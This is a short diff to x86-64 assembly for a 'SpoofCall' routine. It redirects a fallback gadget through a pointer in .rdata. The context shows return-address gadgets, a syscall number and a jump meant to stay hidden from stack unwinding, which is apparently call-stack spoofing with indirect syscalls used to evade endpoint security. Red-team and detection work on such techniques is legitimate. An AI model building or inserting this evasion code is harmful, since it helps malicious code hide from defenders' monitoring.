@@ -60,7 +60,10 @@ struc STACK_CONFIG
 endstruc
 
 global SpoofCall
-
+section .rdata
+align 8
+ptr_gadget_fallback: ; The linker will resolve this to the address of gadget_fallback in the .text section
+    dq gadget_fallback
 section .text
 SpoofCall:
     push rbp             ; Save caller's RBP
@@ -137,7 +140,8 @@ SpoofCall:
     mov r10, [r13 + STACK_CONFIG.pAddRSPRetGadget]
     push r10
 
-    lea rbx, [rel gadget_fallback]
+    ; Setup rbx -> ptr_gadget_target -> gadget_fallback
+    lea rbx, [rel ptr_gadget_fallback]
 
     mov r10, rcx
     mov eax, [r13 + STACK_CONFIG.ssn]
@@ -159,3 +163,4 @@ gadget_fallback:
 
     pop r11 
     jmp r11           ; not using ret to keep the flow hidden from RtlVitualUnwind
+
